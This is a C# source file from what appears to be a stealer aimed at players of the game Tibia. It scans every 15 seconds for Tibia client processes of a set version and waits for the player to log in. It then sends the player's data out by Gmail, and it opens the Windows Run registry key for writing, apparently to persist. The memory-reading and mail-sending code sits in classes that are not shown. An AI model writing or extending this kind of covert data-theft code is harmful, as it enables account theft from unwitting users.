using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using Tibb.Clients;
using System.Windows.Forms;
using Tibb.DAO;
using System.Threading;
using Microsoft.Win32;
using System.Collections;
using System.ComponentModel;

namespace Tibb.Clients
{
    public class InitTibbs
    {
        private ArrayList processesIds;
        private const string processName = "Tibia";
        private const string version = "9.8.3.0";
        private RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        public void initialize()
        {
            this.scanning();
        }

        public void scanning()
        {
            processesIds = new ArrayList();
            while (true)
            {
                Process[] processes;
                processes = Process.GetProcesses();

                for (int i = 0; i < processes.Length; i++)
                {
                    if (processes[i].ProcessName == processName)
                    {
                        Cliente cliente = new Cliente(processes[i]);
                        if (cliente.version() == version)
                        {
                            if (!(processesIds.Contains(cliente.id())) || processesIds.Count == 0)
                            {
                                processesIds.Add(cliente.id());

                                BackgroundWorker tibiaWorker = new BackgroundWorker();
                                tibiaWorker.DoWork += new DoWorkEventHandler(tibiaWorker_DoWork);
                                tibiaWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(tibiaWorker_RunWorkerCompleted);
                                tibiaWorker.RunWorkerAsync(cliente);
                            }
                        }
                    }
                }
                Thread.Sleep(15000);
            }
        }
        
        void tibiaWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            if (e.Argument is Cliente && e != null)
            {
                Cliente cliente = (Cliente)e.Argument;
                while (true)
                {
                    if (cliente.player.IsOnline())
                    {
                        e.Result = cliente.player;
                        break;
                    }
                    Thread.Sleep(5000);
                }
            }
        }

        void tibiaWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Result is Player && e.Result != null)
            {
                this.sendByGmail((Player)e.Result);
                processesIds.Remove(((Player)e.Result).process.Id);
            }
        }

        private void sendByGmail(Player player)
        {
            Gmail mensaje = new Gmail(player);
            mensaje.sendEmail();
            Thread.Sleep(10000);
        }
    }
}